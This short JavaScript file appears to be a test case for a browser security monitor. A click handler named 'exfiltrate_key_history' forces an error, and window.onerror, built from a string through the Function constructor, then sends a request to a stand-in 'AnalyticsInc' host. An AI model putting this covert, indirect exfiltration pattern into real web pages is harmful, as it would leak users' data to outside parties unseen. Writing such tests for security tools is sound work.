function exfiltrate_key_history() {
  window.NotExistingFunction();
  return
}
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error1", true);xmlhttp.send(null);';
var v0 = window;
var v2 = JAM.call(Function, null, [exp]);
JAM.set(v0, "onerror", v2);
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);

